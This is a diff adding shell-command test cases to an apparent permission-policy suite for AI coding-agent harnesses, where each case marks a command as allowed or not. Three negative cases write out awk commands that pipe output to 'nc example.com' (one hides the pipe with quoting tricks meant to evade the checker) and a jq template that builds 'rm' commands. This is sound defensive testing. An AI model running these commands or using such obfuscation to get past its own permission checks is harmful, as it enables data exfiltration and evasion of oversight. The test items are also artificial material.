@@ -5903,6 +5903,59 @@
       "expect": "allow"
     },
     {
+      "id": "awk-regex-alternation",
+      "fix_area": "read",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '$2 ~ /postgres|db-/ {print}' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-awk-division-pipe-to-network",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '{ print $1 / 2 | \"nc example.com 9\" }' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow",
+      "contained_ok": true
+    },
+    {
+      "id": "neg-awk-regex-quote-hides-network-pipe",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '{ if ($1) /\"/; print | \"nc example.com 9\" } # \"' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow",
+      "contained_ok": true
+    },
+    {
       "id": "awk-end-anchor-after-vitest",
       "fix_area": "shell",
       "harnesses": [
@@ -9688,6 +9741,91 @@
       },
       "cwd": "worktree",
       "expect": "allow"
+    },
+    {
+      "id": "jq-shorthand-object-keys",
+      "fix_area": "read",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "jq -r '{name,version}' ${HOME}/other-project/package.json"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "jq-tsv-format-stage",
+      "fix_area": "read",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "jq -r '.scripts | to_entries[] | [.key, .value] | @tsv' ${HOME}/other-project/package.json"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "gh-api-jq-tsv-format",
+      "fix_area": "gh-api",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "gh api repos/example/app/actions/runs --jq '.workflow_runs[:40] | .[] | [.id, .name] | @tsv'"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "gh-api-jq-bare-format",
+      "fix_area": "gh-api",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "gh api repos/example/app/releases/latest --jq @json"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-jq-sh-format-template",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "jq -r '@sh \"rm \\(.name)\"' ${HOME}/other-project/package.json"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
     },
     {
       "id": "gauntlet-read-empty-hidden-marker",
